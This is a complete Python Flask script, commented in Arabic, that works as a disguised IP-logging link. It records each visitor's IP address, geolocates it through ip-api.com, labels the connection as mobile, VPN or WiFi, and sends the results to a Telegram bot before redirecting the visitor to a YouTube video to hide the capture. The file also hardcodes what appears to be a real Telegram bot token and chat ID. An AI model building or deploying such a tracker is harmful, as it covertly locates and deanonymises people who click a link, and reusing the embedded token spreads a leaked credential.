from flask import Flask, request, redirect
import requests

app = Flask(__name__)

# Telegram Bot Details
BOT_TOKEN = '8334218363:AAHUtSFy9BvRPd2VpHxDA-pRSzgNPUay3d4'
CHAT_ID = '5497521471'

YOUTUBE_LINK = "https://youtube.com/watch?v=dQw4w9WgXcQ"

def analyze_ip(ip):
    try:
        url = f"http://ip-api.com/json/{ip}"
        res = requests.get(url, timeout=5)
        data = res.json()

        if data['status'] == 'success':
            country = data.get("country", "N/A")
            city = data.get("city", "N/A")
            isp = data.get("isp", "N/A")
            org = data.get("org", "N/A")

            # فلتر نوع الاتصال (مؤشر تقريبي)
            if "Mobile" in org or "4G" in org or "LTE" in org or "cellular" in isp.lower():
                conn_type = "📱 بيانات موبايل"
            elif "VPN" in org or "VPN" in isp:
                conn_type = "🛡️ VPN أو بروكسي"
            elif "broadband" in org.lower() or "dsl" in org.lower() or "wifi" in org.lower():
                conn_type = "📶 WiFi / DSL"
            else:
                conn_type = "🔍 غير معروف / عام"

            # تجهيز الرسالة
            msg = f"📥 IP Logged: {ip}\n🌍 Country: {country}\n🏙️ City: {city}\n🏢 ISP: {isp}\n⚙️ Org: {org}\n🔍 Connection: {conn_type}"
            return msg
        else:
            return f"IP Logged: {ip} (No Geo Info)"
    except Exception as e:
        return f"IP Logged: {ip} (Lookup failed)"

@app.route('/')
def index():
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    # تحليل الـ IP وبناء الرسالة
    msg = analyze_ip(user_ip)

    # إرسال لتليجرام
    telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": msg
    }
    try:
        requests.post(telegram_url, json=data)
    except Exception as e:
        print("Telegram Error:", e)

    return redirect(YOUTUBE_LINK)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
